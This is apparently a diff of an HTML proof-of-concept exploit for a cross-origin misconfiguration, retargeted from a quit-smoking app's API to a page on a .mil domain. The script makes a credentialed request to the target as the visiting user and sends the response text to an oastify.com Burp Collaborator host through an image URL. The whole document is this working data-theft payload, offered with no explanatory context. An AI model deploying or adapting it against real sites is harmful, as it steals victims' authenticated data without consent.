@@ -4,14 +4,14 @@
     <script>
         var req = new XMLHttpRequest();
         req.onload = reqListener;
-        req.open('GET', 'https://quitplan.ycq2.org/api/slips?_method=PUT&time=Mon+Dec+23+2024+23%3a48%3a18+GMT-0800+%28Pacific+Standard+Time%29&note=&tz=-08%3a00&newTrigger=', true);
+        req.open('GET', 'https://cadbimcenter.erdc.dren.mil/Default.aspx', true);
         req.withCredentials = true;
         req.send();
 
         function reqListener() {
             // Send the response data to your Burp Collaborator server
             var img = new Image();
-            img.src = 'https://i5osl10i2gvsxmc0kf830p0v7mdd1apz.oastify.com/?data=' + encodeURIComponent(this.responseText);
+            img.src = 'https://yqsbdawyqsy57i4fjwt3q3o28tek2fq4.oastify.com/?data=' + encodeURIComponent(this.responseText);
         }
     </script>
 </head>
